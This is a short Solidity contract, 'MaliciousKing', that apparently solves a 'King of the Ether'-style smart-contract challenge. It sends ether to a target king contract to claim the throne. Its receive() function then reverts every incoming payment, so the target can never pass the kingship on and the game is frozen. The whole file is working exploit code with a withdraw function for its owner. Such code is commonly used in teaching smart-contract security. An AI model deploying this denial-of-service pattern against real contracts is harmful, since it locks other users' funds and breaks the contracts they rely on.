// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract MaliciousKing {
    address owner;
    address kingContract;

    constructor(address _kingContract) {
        kingContract = _kingContract;
        owner = msg.sender;
    }

    // Send enough ether to become the king
    function attack() external payable {
        require(msg.value > 0, "You need to send some Ether to become the king.");
        (bool success, ) = kingContract.call{value: msg.value}("");
        require(success, "Transfer failed.");
    }

    // Withdraw eth sent to this contract
    function withdraw() external {
        require(msg.sender == owner, "you are NOT the owner");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed.");
    }

    // Make the fallback function revert any incoming transactions
    receive() external payable {
        revert("You cannot become the king.");
    }
}